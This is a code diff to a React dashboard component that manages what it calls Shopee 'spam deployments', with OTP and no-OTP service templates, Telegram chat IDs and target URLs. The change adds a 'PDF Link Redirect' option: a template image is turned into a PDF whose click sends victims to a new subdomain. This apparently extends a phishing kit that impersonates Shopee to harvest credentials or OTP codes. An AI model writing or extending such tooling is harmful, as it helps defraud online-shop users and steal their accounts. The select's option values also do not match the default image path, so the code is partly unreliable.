@@ -59,6 +59,9 @@ export default function Sandbox() {
     const [price, setPrice] = useState('');
     const [targetUrl, setTargetUrl] = useState('');
     const [outputPdf, setOutputPdf] = useState('');
+    const [generatePdf, setGeneratePdf] = useState(false);
+    const [templateImages, setTemplateImages] = useState([]);
+    const [selectedImage, setSelectedImage] = useState('');
 
     // Shopee SPM — active spam deployments for auto-fill
     const [spamDeployments, setSpamDeployments] = useState([]);
@@ -180,6 +183,30 @@ export default function Sandbox() {
         }
     }, [serviceKey, durasi, templates]);
 
+    // Fetch images for the selected template
+    useEffect(() => {
+        if (!serviceKey) return;
+        const fetchImages = async () => {
+            try {
+                const res = await fetch(`/api/dashboard/templates/files?template_key=${serviceKey}`);
+                if (!res.ok) throw new Error('Failed to fetch files');
+                const files = await res.json();
+                const images = files.filter(f => !f.is_dir && (f.name.endsWith('.jpg') || f.name.endsWith('.jpeg') || f.name.endsWith('.png')));
+                setTemplateImages(images);
+                if (images.length > 0) {
+                    setSelectedImage(images[0].path);
+                } else {
+                    setSelectedImage('');
+                }
+            } catch (e) {
+                console.error('Error fetching template images', e);
+                setTemplateImages([]);
+                setSelectedImage('');
+            }
+        };
+        fetchImages();
+    }, [serviceKey]);
+
     const handleManualDeploy = async (e) => {
         e.preventDefault();
         
@@ -212,7 +239,9 @@ export default function Sandbox() {
                     telegram_chat_id: telegramChatId,
                     price: price ? parseFloat(price) : null,
                     target_url: targetUrl || null,
-                    output_pdf: outputPdf || null
+                    output_pdf: outputPdf || null,
+                    image_path: generatePdf ? selectedImage : null,
+                    generate_pdf: generatePdf
                 })
             });
             const data = await res.json();
@@ -555,6 +584,54 @@ export default function Sandbox() {
                                     className="w-full bg-zinc-900 border border-zinc-800 rounded px-3 py-2 text-white placeholder-zinc-700 focus:outline-none focus:border-zinc-500 font-mono"
                                 />
                             </div>
+
+                            {(serviceKey === 'shopee-spam-otp' || serviceKey === 'shopee-spam-nootp') && (
+                                <div className="space-y-2 border-t border-zinc-800 pt-4 mt-4">
+                                    <label className="flex items-center gap-2 cursor-pointer">
+                                        <input
+                                            type="checkbox"
+                                            checked={generatePdf}
+                                            onChange={(e) => setGeneratePdf(e.target.checked)}
+                                            className="rounded border-zinc-700 bg-zinc-900 text-emerald-500 focus:ring-emerald-500/20"
+                                        />
+                                        <span className="font-semibold text-zinc-300 uppercase text-xs">Generate PDF Link Redirect (Opsional)</span>
+                                    </label>
+                                    
+                                    {generatePdf && (
+                                        <div className="pl-6 space-y-3">
+                                            <div className="space-y-1">
+                                                <label className="block font-semibold text-zinc-400 uppercase text-[10px]">Gambar Source PDF</label>
+                                                {templateImages.length > 0 ? (
+                                                    <select
+                                                        value={selectedImage}
+                                                        onChange={(e) => setSelectedImage(e.target.value)}
+                                                        className="w-full bg-zinc-900 border border-zinc-800 rounded px-3 py-2 text-white focus:outline-none focus:border-zinc-500 font-mono text-xs"
+                                                    >
+                                                        {templateImages.map(img => (
+                                                            <option key={img.path} value={img.name}>{img.name}</option>
+                                                        ))}
+                                                    </select>
+                                                ) : (
+                                                    <div className="text-[11px] text-zinc-600 font-mono px-3 py-2 bg-zinc-900 border border-zinc-800 rounded">
+                                                        Mencari gambar di template...
+                                                    </div>
+                                                )}
+                                                <span className="text-[10px] text-zinc-600 block">Gambar akan diubah ke PDF, jika diklik akan otomatis redirect ke subdomain baru.</span>
+                                            </div>
+                                            <div className="space-y-1">
+                                                <label className="block font-semibold text-zinc-400 uppercase text-[10px]">Nama File PDF Output (Opsional)</label>
+                                                <input
+                                                    type="text"
+                                                    value={outputPdf}
+                                                    onChange={(e) => setOutputPdf(e.target.value)}
+                                                    placeholder="Default: otomatis.pdf"
+                                                    className="w-full bg-zinc-900 border border-zinc-800 rounded px-3 py-2 text-white placeholder-zinc-700 focus:outline-none focus:border-zinc-500 font-mono text-xs"
+                                                />
+                                            </div>
+                                        </div>
+                                    )}
+                                </div>
+                            )}
 
                             {serviceKey === 'shopee-spm' && (
                                 <>
